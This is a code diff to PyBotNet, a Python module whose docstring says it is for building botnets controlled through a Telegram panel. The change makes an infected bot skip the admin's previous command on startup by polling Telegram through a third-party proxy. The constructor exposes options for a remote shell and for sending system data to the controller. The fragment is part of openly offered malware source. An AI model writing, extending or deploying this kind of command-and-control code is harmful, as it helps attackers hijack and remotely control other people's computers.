@@ -8,7 +8,6 @@ import logging
 import re
 
 
-
 class PyBotNet:
     '''
     A module for building botnets with Python and Telegram control panel\n
@@ -20,7 +19,8 @@ class PyBotNet:
             ADMIN_CHAT_ID,
             show_log=False,
             send_system_data=True,
-            is_shell=True
+            is_shell=True,
+            ignored_previous_command=True
     ):
 
         self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
@@ -31,6 +31,7 @@ class PyBotNet:
 
         self.previous_update_id = [0]
         self.start_time = util.get_current_epoc_time()
+        # just for ofset to last command!
 
         # logging:
         if self.show_log:
@@ -42,6 +43,10 @@ class PyBotNet:
         self.my_logger = logging
         self.my_logger.basicConfig(level=self.log_level)
         self.logger = self.my_logger.getLogger('PyBotNet')
+
+        if ignored_previous_command:
+            self.logger.info("The first command is ignored and not executed")
+            self.get_last_command_by_third_party_proxy()
 
     def __str__(self) -> str:
         return settings.pybotnet_info
@@ -58,7 +63,7 @@ class PyBotNet:
 
     def get_last_command_by_third_party_proxy(self):
         '''return last admin message or False'''
-        #TODO : it is better to dont run this function every time when running.
+        # TODO : it is better to dont run this function every time when running.
         return util.get_last_admin_command_by_third_party_proxy(
             self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN,
             self.previous_update_id, self.logger)
